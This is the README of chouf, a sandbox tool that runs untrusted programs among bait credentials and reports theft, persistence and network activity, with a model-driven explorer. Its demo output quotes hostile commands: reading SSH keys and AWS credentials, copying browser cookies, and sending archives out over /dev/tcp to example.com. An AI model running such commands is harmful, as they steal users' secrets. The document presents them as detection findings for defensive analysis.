# chouf

*chouf* (« look » in Darija) runs a program in a throwaway sandbox full of **bait secrets** and tells you, in plain words,
what it really did: which secrets it went after, how it will start again by itself, what it now trusts.

```
$ chouf run --file install-theme.sh -- sh /input/install-theme.sh

Secrets it went after
 ! opened, read ~/.aws/credentials  (AWS access keys)
             by cat /root/.aws/credentials /root/.ssh/id_ed25519
 ! opened, read ~/.config/google-chrome/Default/Cookies  (Chrome cookies)
             by cp /root/.config/google-chrome/Default/Cookies /tmp/c
 ! opened, read ~/.ssh/id_ed25519  (SSH private key)
             by cat /root/.aws/credentials /root/.ssh/id_ed25519

Ways it will run again by itself
 ! added     /etc/cron.d/theme-update  (scheduled task)
             by sh /input/install-theme.sh
 ! opened, wrote ~/.bashrc  (runs in every new terminal)
             by sh /input/install-theme.sh

What it now trusts
 ! added     /etc/apt/sources.list.d/theme.list  (adds a software source)
             by sh /input/install-theme.sh

Everything else it changed
   added     /tmp/c
             by cp /root/.config/google-chrome/Default/Cookies /tmp/c

Where it connected
   example.com (2606:4700:10::6814:179a) port 80 tcp  by bash -c exec 3<>/dev/tcp/example.com/80; printf "POST /up HTTP/1.0\r\nContent-Length: 4\r…

Programs it ran (7)
   sh /input/install-theme.sh
     cat /root/.aws/credentials /root/.ssh/id_ed25519
     head -c 2000
     ls /root/.mozilla/firefox/
     cp /root/.config/google-chrome/Default/Cookies /tmp/c
     bash -c exec 3<>/dev/tcp/example.com/80; printf "POST /up HTTP/1.0\r\nContent-Length: 4\r…
       head -1
```

## Explore: an AI tester, then a verdict

`chouf run` shows what one run did. Some programs only misbehave after a question, a sub-command or a delay.
`chouf explore` lets a model drive the program in the same sandbox, like a careful tester, then compares what the
program **says** with what it **did**. A "theme manager" that hides its theft behind a prompt and a 15 s delay:

```
$ chouf explore --claim "a desktop theme manager" --file themectl -- sh /input/themectl

How chouf explored it
   [1] $ sh /input/themectl · exit 0  — the command you asked to check
   [2] $ sh /input/themectl list · exit 0  — List the available themes to see how the tool interacts with the filesystem.
   [3] $ sh /input/themectl install nordic · exit 0  — I will test the install command to see if it attempts to download themes from the network.
   [4] $ sh /input/themectl install nordic  (typed "y") · exit 0  — I will attempt to install the nordic theme by providing 'y' to the confirmation prompt.
   [5] $ sh /input/themectl sync · exit 0  — I will run the sync command to observe its background behavior as advertised.
   [6] waited 20 s  — The sync command started a background process that sleeps for 15 seconds, so I will wait to see if it performs any network activity or file modifications.

Secrets it went after
 ! opened, read ~/.ssh/id_ed25519  (SSH private key)
             by tar cz /root/.ssh /root/.aws
 …
Where it connected
   example.com (2606:4700:10::ac42:93f3) port 80 tcp  by bash -c exec 3<>/dev/tcp/example.com/80; cat >&3

What it says vs what it does  (opinion of gemini-3.1-flash-lite, not a measurement)
   MALICIOUS: it steals, hides or contradicts itself
   The program claims to be a desktop theme manager, but it performs unauthorized data exfiltration. It secretly
   accesses sensitive SSH keys and AWS credentials and transmits them to an external server under the guise of a
   background sync process.
   !! says: themectl sync keeps themes up to date in the background
      does: The sync process executes a command to archive and exfiltrate ~/.ssh and ~/.aws directories to an external server.
   ok says: themectl install NAME downloads and installs a theme
      does: The program creates directories and files in ~/.themes as expected for a theme manager.
```

- The model needs a Gemini key: `GEMINI_API_KEY` or `~/.config/chouf/gemini` (`CHOUF_MODEL` picks the model).
  It reaches curl through a private file, never the command line.
- Everything the program prints is fenced and labelled untrusted before the model sees it, the model's answers are
  validated before anything runs (at most 6 steps, waits of 60 s), and everything runs in the sandbox.
- The verdict is an opinion printed next to chouf's measured findings: it can neither hide nor change them.

## How it works

- **A rootless podman container** (Ubuntu 24.04 by default). The program runs as root inside it, so installers behave as
  they would with `sudo`, but only the container's copy of the system is touched. `podman diff` gives every system file
  added, changed or deleted, minus what an empty container does by itself (measured once per image).
- **A fake home full of bait**: SSH and GPG keys, AWS, GitHub, npm, Docker and Kubernetes credentials, Chrome and Firefox
  cookies and passwords, a Bitcoin wallet, a `.env`, a shell history with an API key. None of it is real, and every value
  carries a token unique to the run, so a leaked secret can be traced back to the run that leaked it.
- **A kernel tracer, `chouf-trace`** (optional, root service, eBPF): from the first instruction of the program, which
  process ran what (with its arguments and parent), opened which file, connected where, and the domain name behind each
  address (read from the DNS answers). Each finding then says *which program* did it. The service only watches the
  sandbox's cgroup, and a user can only watch cgroups they own: nobody sees another user's processes.
- **inotify from the host**: the fake home is a bind mount, so every open, read, write, create and delete inside it is
  seen from outside, without root, including files written into folders created a microsecond earlier.

## Install

Website: https://onezdtr.github.io/chouf

```
curl -fsSL https://raw.githubusercontent.com/onezdtr/chouf/main/get.sh | sudo sh    # latest release, x86_64 or aarch64
```

Or from the source tree: `./install.sh` (chouf alone, in `~/.local/bin`) or `sudo ./install.sh` (chouf and its kernel
tracer, `chouf-trace`, as a system service). chouf needs rootless podman. The tracer needs Linux 5.11+ with BTF; to
build it, clang and bpftool. Without the tracer, chouf still reports what was touched, but not by whom, not where it
connected, without the local-network guard and without proof of what left the machine.

## Usage

```
chouf run     [--image IMAGE] [--timeout SECS] [--no-net] [--file PATH]... -- COMMAND [ARGS]...
chouf explore [same options] [--claim TEXT] [--steps N] -- COMMAND [ARGS]...
```

Exit code: 0 nothing alarming, 1 secrets / persistence / trust findings, 2 chouf itself failed.
Each run is kept in `~/.local/share/chouf/sessions/<id>/` (`report.json`, `stdout`, `stderr`, the fake home).

## Status

Early. Done: sandbox, baits, file watching, kernel tracer (who did what, where it connected), the explorer and its
verdict. Next: a plain-language report for non-experts, more baits (browsers, password managers, crypto wallets).

## Related work

chouf puts together pieces that exist separately (checked November 2026):

- **OpenSSF package-analysis**, **Packj**: run packages from registries in a sandbox and record files, network and
  commands (strace, gVisor), for experts and pipelines. No bait secrets, no explorer, no plain verdict.
- **sandbox-node**: npm/pnpm/yarn/bun installs in a Docker or Podman sandbox, with fake credentials. JavaScript
  installs only, no kernel tracing, no model.
- **Koru**: eBPF and honeytokens to catch AI agents touching credentials. No sandbox for an unknown program.
- **Tracee, Falco, Tetragon, Inspektor Gadget, AgentSight**: eBPF observability for production or for AI agents.
- **ANY.RUN, Joe Sandbox**: commercial malware sandboxes with AI summaries, for analysts.
- **CHASE** (arXiv 2601.06838): LLM agents that judge PyPI packages; no code published.

What chouf adds: any program or install script, a home full of realistic bait, the kernel's account of who did
what, a model that drives the program like a tester, and a verdict a non-expert can act on, all open source.

## Tests

```
cargo test                          # unit tests
cargo test --workspace -- --include-ignored     # + real runs through podman (and the tracer, when installed)
```

## License

GPL-2.0-only
